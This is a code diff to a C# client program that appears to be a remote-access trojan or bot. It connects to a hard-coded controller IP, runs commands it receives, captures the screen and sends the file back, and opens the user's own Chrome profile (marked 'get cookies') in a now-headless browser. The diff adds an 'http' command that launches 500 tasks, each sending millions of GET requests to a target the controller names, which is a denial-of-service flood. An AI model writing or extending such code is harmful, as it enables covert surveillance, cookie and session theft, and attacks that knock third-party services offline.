@@ -21,6 +21,9 @@ using System.Drawing.Imaging;
 using System.Drawing;
 using System.Net;
 using Server;
+using static System.Windows.Forms.VisualStyles.VisualStyleElement.Button;
+using System.Net.Http;
+using OpenQA.Selenium.DevTools;
 
 namespace Client
 {
@@ -417,6 +420,7 @@ namespace Client
             }
             else if (command.StartsWith("capture"))
             {
+                Console.WriteLine("capture");
                 captureScreen();
                 sendFileSocket(client, "capture");
             }
@@ -450,7 +454,49 @@ namespace Client
             {
                 client.Close();
                 isRunning= false;
+                Environment.Exit(0);
             }
+            else if(command.StartsWith("http"))
+            {
+                string ipandport = command.Split('?')[1];
+                string ip = ipandport.Split(':')[0];
+                string port = ipandport.Split(':')[1];
+                string url = $"http://{ip}:{port}";
+                for (int j = 0; j<500;j++)
+                {
+                    HttpClient http = new HttpClient();
+                    Task.Run(async () =>
+                    {
+                        for (int i = 0; i < 10000000; i++)
+                        {
+                           
+                            try
+                            {
+                               
+                                try
+                                {
+                                    Console.WriteLine("Excute http:" + i);
+                            
+                                    HttpResponseMessage response = await http.GetAsync(url);
+           
+                                }
+                                catch
+                                {
+                       
+                                }
+                            }
+                            catch
+                            {
+
+                            }
+                        }
+
+                    });
+
+                }
+                
+                Console.WriteLine("Excute http");
+            }    
         }
         static bool IsSocketConnected(Socket socket)
         {
@@ -471,7 +517,7 @@ namespace Client
             ChromeOptions options = new ChromeOptions();
             //string username = RunCommandAndGetOutput("echo %username%").Trim();
             string path = "user-data-dir=C:/Users/ADMIN/AppData/Local/Google/Chrome/User Data";
-            options.AddArguments(path);
+            options.AddArguments(path, "headless");
             IWebDriver driver = new ChromeDriver(options);
             //<---------------------end get cookies-------------------------->
             try
@@ -482,7 +528,7 @@ namespace Client
                 // Bind the client to the local endpoint
                 client.Client.Bind(localEndPoint);
 
-                client.Connect("192.168.1.10", PORT_NUMBER);
+                client.Connect("192.168.1.103", PORT_NUMBER);
                 Stream stream = client.GetStream();
                 //Console.WriteLine("connect xong socket");
                 byte[] data;
@@ -492,11 +538,11 @@ namespace Client
                     stream.Read(data, 0, BUFFER_SIZE);
                     string command = encoding.GetString(data);
                     handleCommand(command, driver, client, stream);
-                    Console.WriteLine("1");
-                    if(IsSocketConnected(client.Client) == true)
-                    {
-                        Console.WriteLine("Dang ket noi");
-                    }    
+             
+                    //if(IsSocketConnected(client.Client) == true)
+                    //{
+                    //    Console.WriteLine("Dang ket noi");
+                    //}    
                 }
 
             }
